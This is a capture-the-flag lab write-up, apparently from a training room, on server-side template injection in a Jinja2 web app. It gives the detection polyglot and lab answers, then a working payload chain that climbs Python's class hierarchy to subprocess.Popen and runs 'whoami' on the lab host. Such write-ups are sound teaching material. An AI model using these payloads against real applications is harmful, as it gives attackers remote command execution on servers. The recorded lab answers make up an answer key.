
# ***SSTI***

## *Detection*

The vulnerable url is http://10.10.55.134:5000/profile/$USERNAME

A fast way of detecting SSTI vulnerability is injecting the combination of these
symbols:

```
${{<%[%'"}}%
```

- What sequence of characters causes the application to throw an error?

> {{

---

## *Identification*

- What template engine is being used in this application?

> jinja2

---

## *Syntax*

- How do you start a comment in Jinja2?

> {#

---

## *Exploitation*

The idea is to climb up the inheritence tree to "object", and the climb down the tree
to the classes, that are able to start subprocess:

1. Pick a class: http://10.10.55.134:5000/profile/{{''.__class__}}

> Welcome to the profile of <class 'str'>!

2. List the parents: http://10.10.55.134:5000/profile/{{''.__class__.__mro__}}

> Welcome to the profile of (<class 'str'>, <class 'object'>)!

3. Pick object and list its children: http://10.10.55.134:5000/profile/{{''.__class__.__mro__[1].__subclasses__()}}

> ...List of children. Find the index of "subprocess.Popen"

4. Pick subprocess.Popen: http://10.10.55.134:5000/profile/{{''.__class__.__mro__[1].__subclasses__()[401]}}

> Welcome to the profile of <class 'subprocess.Popen'>!

5. Invoke constructor with a command you'd like and read the output with "communicate()"
method: http://10.10.55.134:5000/profile/{{''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate()}}

> Welcome to the profile of (b'jake\n', None)!

- What is the result of the "whoami" shell command?

> jake

---

## *Case Study*

- What payload was used to confirm SSTI in Uber?

> {{ '7'*7 }}
